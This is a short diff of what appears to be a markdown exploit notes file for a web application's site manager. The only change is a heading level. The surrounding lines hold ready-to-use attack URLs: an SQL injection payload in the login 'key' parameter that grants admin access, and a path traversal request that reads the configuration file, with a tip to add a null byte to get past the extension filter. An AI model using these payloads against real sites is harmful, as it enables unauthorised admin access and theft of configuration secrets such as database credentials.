@@ -23,7 +23,7 @@ Sometimes returns "Invalid key error", then press F5 and you will logged as an a
 http://site.com/sitemgr/login.php?key=' union select 0,1,0,'sitemgr' -- -
 ```
 
-# Authenticated File Dissclosure
+## Authenticated File Dissclosure
 Only files with .php extension, but don't forget try nullbyte to avoid that :D
 ```
 http://site.com/sitemgr/langcenter/language_file.php?language_area=front&domain_id=1&language_id=../conf/config.inc
